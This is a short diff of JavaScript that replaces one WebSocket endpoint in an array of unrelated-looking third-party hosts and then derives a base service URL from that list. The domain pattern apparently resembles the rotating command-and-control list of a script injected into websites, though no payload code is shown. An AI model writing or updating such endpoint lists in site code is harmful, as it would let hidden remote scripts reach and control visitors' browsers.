@@ -19,7 +19,7 @@ const t = [
   'cdn.clearfieldswimming.com',
   'cdn.richardacademy.cfd',
   'wss://athollcottage.com/connection/',
-  'wss://api.personalloanonline.net/ws/'
+  'wss://kidsprepnest.org/vi/'
 ];
 const primaryServiceBase = 'https://' + t.find(host => !host.includes('://'));
 window.controller = null, window.transport = null, window.shadowRoot = null;
